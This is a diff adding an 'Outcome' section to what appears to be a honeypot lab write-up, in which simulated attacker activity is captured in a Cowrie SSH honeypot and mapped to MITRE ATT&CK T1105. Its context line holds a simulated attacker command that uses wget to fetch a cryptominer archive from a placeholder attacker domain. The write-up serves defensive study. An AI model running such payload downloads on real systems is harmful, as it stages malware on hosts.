@@ -240,6 +240,22 @@ wget https://evil.example/cryptominer.tar.gz
 ## MITRE ATT&CK MAPPING
 
 - T1105 – Ingress Tool Transfer
+
+  ## Outcome
+
+✅ Simulated post-compromise tool transfer activity using common Linux utilities (`wget` and `curl`)
+
+✅ Generated telemetry associated with attacker file download attempts
+
+✅ Captured command execution activity within the Cowrie SSH honeypot
+
+✅ Collected indicators of compromise (IOCs) including domains, URLs, and file names
+
+✅ Recorded attacker behavior consistent with post-exploitation and malware staging activity
+
+
+
+
 ---
 
 # Use Case 4: Threat Intelligence Collection
